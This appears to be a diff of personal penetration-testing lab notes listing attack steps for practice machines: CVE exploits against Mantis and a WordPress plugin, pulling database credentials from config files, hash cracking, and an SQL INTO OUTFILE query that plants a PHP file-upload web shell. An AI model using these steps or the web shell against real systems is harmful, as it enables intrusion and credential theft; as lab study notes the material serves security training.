@@ -2,6 +2,18 @@
 #### Extplorer => Filemanager 
 1. Get dora pw from .htusers.php then `hashcat -m 3200` 
 
+#### Mantis => Bug tracker 
+1. Use gobuster to find /bugtracker ; use CVE-2017-12419 
+2. Pull config_inc.php to get mysql creds 
+3. Log in to mantis & use CVE-2019-15715 
+
+#### Mzeeav => File upload injection 
+1. Browse around to find code that shows magic number check. 
+
+#### Nukem => WP simple file list 
+1. Run `wpscan --url http://{{TARGET_IP}} --api-token {{TOKEN}} --enumerate vp` 
+2. Exploit = 48979 , look in wp-config.php for next user's creds 
+
 #### Press => Flatpress 
 1. Exploit = https://github.com/flatpressblog/flatpress/issues/152 
 
@@ -27,5 +39,7 @@ https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798
 ` SELECT "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>" INTO OUTFILE 'C:/wamp/www/uploader.php'; ` 
 
 
+
 Also check for /webdav , /zm , /login 
 Use curl -v to check header & version. 
+
